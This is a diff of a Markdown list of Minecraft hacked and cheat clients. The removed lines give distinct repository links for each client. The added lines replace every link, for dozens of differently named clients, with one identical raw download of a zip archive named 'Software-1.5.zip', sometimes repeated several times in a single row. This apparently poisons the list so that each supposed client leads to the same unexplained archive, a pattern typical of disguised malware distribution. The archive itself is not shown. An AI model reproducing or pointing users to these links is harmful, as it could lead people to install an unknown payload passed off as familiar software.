-| Virgin | https://github.com/WalmartSolutions/Virgins-4.4 // https://github.com/WalmartSolutions/Virgins-1.5.0 // https://gitlab.com/3000IQPlay/virgins-1.2 // https://github.com/WalmartSolutions/Virgin-Latest // https://github.com/WalmartSolutions/Virgin-0.22.0 // https://github.com/WalmartSolutions/Virgin-0.21.0 // https://github.com/WalmartSolutions/Virgin-b0.9.5-SRC |
-| Volt | https://github.com/knezoWTF/Open-Volt |
-| Vonware | https://github.com/dada994a/vonware-4.1.0-clean // https://github.com/primewk/vonware-deobf |
-| Vox                 | https://github.com/Rabies1337/Vox                       |
-| VydraHack | https://github.com/VVriter/VydraHack |
-| Vrpos               | https://github.com/cocoapc911/Vrpos                     |
-| VyperHax            | https://github.com/KRYMZ0N/VyperHax                     |
-| W1seHack            | https://github.com/pineapplebby/w1sehack-public         |
-| Walksy | https://github.com/5mog/cwhack-walksyclient-1.19.2 |
-| WebHack             | https://github.com/chris2rich/webhack // https://github.com/Nutelaspaceman/WebHack |
-| Warden | https://github.com/WalmartSolutions/Warden-3.2 |
-| WeepCraft           | https://github.com/PlutoSolutions/WeepCraft // https://github.com/FeydH/Weepcraft-1.12 |
-| WaizyHack           | https://cdn.discordapp.com/attachments/628306876479701002/640683072341278730/waizyhacktest2_1.jar |
-| Walksy | https://github.com/5mog/cwhack-walksyclient-1.19.2 |
-| WDNC | https://github.com/playstation452/WDNC-Client // https://github.com/wdnc-mc-client/WDNC-Client |
-| WetHack             | https://github.com/weterandevelopment/wethack           |
-| WexSide             | https://wexside.xyz // https://github.com/7b7aProject/WexSide-crack-1.12.2 |
-| WhiskerZ            | https://github.com/Hi-doki/WhiskerZ                     |
-| Wild                | https://www.wildclient.ru                               |
-| Windy               | https://github.com/ImCzf233/windy-opensource            |
-| Wing Client | https://github.com/Tehnicki1/WingClient |
-| Winter              | https://github.com/pvpb0t/Winter                        |
-| WintWare            | https://github.com/noom1337/WintWare-source-code        |
-| WizClient | https://github.com/its-wiz/WizClient |
-| WOO                 | https://github.com/maywr/WOO-Buildable                  |
-| Wonderwhale.ng | https://github.com/dada994a/wonderwhale_ng |
-| WubzMod             | https://github.com/dkonis/WubzMod                       |
-| Wurst- / WurstMinus | https://github.com/TheReal3rd/WurstMinus-Public         |
-| Wurst+1 / WurstPlusOne | https://github.com/TrvsF/wurstplus-one                  |
-| Wurst+2 / WurstPlusTwo | https://github.com/WurstPlus/wurstplus-two              |
-| Wurst+3 / WurstPlusThree | https://github.com/WurstPlus/wurst-plus-three           |
-| Wurst+4 / WurstPlusFour | https://github.com/levkush/wurst-plus-four              |
-| Xanax               | https://github.com/PlutoSolutions/Xanax                 |
-| Xannax              | https://github.com/The-Gopro336-Archive/Xannax-master   |
-| Xatzotica           | https://github.com/XatzClient/Xatzotica                 |
-| Xdolf               | https://github.com/sudofox/xdolf                        |
-| Xeno                | https://github.com/3000IQPlay/Xeno-Client // https://github.com/Sxmurai/xeno-client-buildable |
-| Xenophyre           | https://github.com/KRYMZ0N/Xenophyre                    |
-| XG42                | https://github.com/Skitttyy/xg-42-cracked // https://github.com/4wl/XG42 |
-| Xl Client | https://github.com/2young2care/Xl-Client-Beta-finally- // https://github.com/2young2care/Last-Xl-Client-Beta |
-| XSWare              | https://github.com/XSS6-2b2t/XSWARE-RELEASE             |
-| Xulu                | https://github.com/Elementars/Xulu-v1.5.2 // https://github.com/The-Gopro336-Archive/XULU_Buildable_SRC |
-| Xulu+ / XuluPlus    | https://github.com/master7720/XuluPlus                  |
-| Xyla | https://github.com/Tehnicki1/Xyla |
-| Yasashii            | https://github.com/TerrificTable/Yasashii-Rewrite       |
-| Yee                 | https://cdn.discordapp.com/attachments/689371591976681522/728990362672300042/Yee-Client-B2.4-1.12.2-release.jar // https://cdn.discordapp.com/attachments/695548730664812635/695548986756431912/Yee-Client-2.3-release.jar |
-| YoinkHack           | https://github.com/PlutoSolutions/YoinkHack             |
-| Zamorozka           | https://zamorozka.fun // https://github.com/PlutoSolutions/Zamorozka |
-| Zelix               | https://github.com/ImCzf233/zelix-opensource            |
-| ZenGit              | https://github.com/noom1337/ZenGit-Hacked-Client        |
-| Zenith              | https://github.com/Pan4ur/Zenith-client // https://github.com/The-Gopro336-Archive/Zenith-Public   |
-| Zenith | https://github.com/yourefavdev/zenith // https://github.com/dexoncpvp/zenith |
-| Zeon                | https://github.com/CrystalCL/zeon-crack // https://github.com/ZeonDevelopment/Zeon                 |
-| ZeroDay             | https://intent.store                                    |
-| ZeroHack            | https://github.com/panpanadc/Zero-Hack                  |
-| ZeroTwo             | https://github.com/CatsAreGood1337/ZeroTwo-src          |
-| Zeus                | https://github.com/ezLeaks/Zeus                         |
-| Zinc                | https://github.com/BigJayMuffinSkidsShit/Zinc-0.1       |
-| Zirconium           | https://github.com/3000IQPlay/Zirconium-1.3.2           |
-| Zispanos            | https://github.com/zispanos/Zispanos-Backdoor-Rewrite   |
-| Zodiac              | https://github.com/cattyngmd/zodiac                     |
-| Zori                | https://github.com/slol2/zori-but-actually-good         |
-| Zork                | https://github.com/AckerRun1337/Zork-Client             |
-| ZSpaceHack | https://github.com/ApertureStatic/ZSpaceHack-Public |
-| ZWare.CC | https://github.com/ZWareDevelopment/ZWare.cc // https://github.com/ZWareDevelopment/ZWare.cc-Old |
-| Zyklon | https://github.com/jeopardization/Zyklon |
+| 06dWare             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| 1.19 Client         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| 198macros | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| 303Hack / ThreeZeroThreeHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| 404 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| 3arthh4ck / Phobos Newbase | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| 5C | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| 711.club            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| AbHack              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Abstract            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Abyss               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| AbyssBeta           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip     |
+| Acid                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| AClient             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| Achilles | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Adequacy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Adopted | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Agalar              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| AgloHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| AgonyClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| AidsHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| AimWhere            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| Alien | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| AllahClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| AllahWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Allusion            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| AlulaHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Ananta              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| AndyClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| ApeClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ApeHax              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Apollo              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| ApollyonClient      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Aquarius            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Arctic              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Ares                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Argon | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ArchWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Arsenic | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Arsenic             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Aresnic | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Arsie               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Artemis             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Asteria.rip | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Astro.dev           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Atani | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Atlas               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Atom                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| AtomBeta            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Atomic              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Atrium              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Augustus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Aurora              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Aurora | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Aurora New          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Ayakashi            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Azorius.club | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| AzuraX              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Azure               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip  |
+| Backdoored          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Badlion+ / BadlionPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Banan+ / BananPlus  | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Bandito.club        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Banzem              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Bape                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Bartender           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| BaseBand            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BBCWare             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| BeefSense           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| Beer                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| BetaX | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BigG                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| BerryBobus          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| BigRat              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| BlackAndWhite       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Blackout            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| BladeCore | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BleachHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Blessed | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BLM                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| BloodHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| BloodyClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BloomWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip / https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BlueZenith          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Bobr                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| BobrWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| Bonk                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Bopis.club          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| BossHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| BossWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| BoyKisser | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Boze                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BozoWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Breeze | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BTHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| BubbyClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip  |
+| BussinUtilites      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Byte | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Byte Utility | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| C.U.M Fusion / CUM Fusion | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Caizm | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CakeClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Calypso             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Candy               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Candy++ / CandyPlusPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| CarnageReborn | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CarrotHack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Cascade             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Catalyst            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CatClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CatClient+ / CatClientPlus / ThighWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Catgirl | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Catmi               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                            |
+| Catmi Rewrite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CatsWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| CatUtilities | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CCSHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Cebulionware.NEXT   | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Celestial           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip(1.12.2) |
+| Celestial Recode | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Claudius            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Click               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| ClickCrystals       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Client              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CliNet              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Cloud               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Cobalt              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Coffee              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| CoinsClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ColaHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| ConstHack.cc        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| CookieClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Cosmos              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| CousinWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Cr33pyWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Cracked | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Cranberry           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| CreeperClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Creepy Salhack      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Crepe               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CrispyClient        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CrossSince | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| CrystalClient       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Cue                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Cupid               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| CurryMod | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Cursa               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Curse | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Cute                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                             |
+| CwHack              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| CXClient            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Dactyl / Moonlight  | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dallas              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| DarkClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| DarkYaw             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| DeadCode | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| DebugHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| DecClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Delta               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| Demise              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip  |
+| Density             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| DentClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Destroy Premium     | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| DestroySquad        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip    |
+| Devu                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                             |
+| DHMClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| DiabloX | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dimasik | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Distance            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dog Client | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Doki                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dope                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| DoragonClient       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| DotGod.cc           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dragon              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Dream               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| DrugHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| DrugHack Recode | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Duperman            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| DulyClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Editme              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Elementars.com      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Elite | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Elypsa | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Elysian             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Ensamble | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Epitaph | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
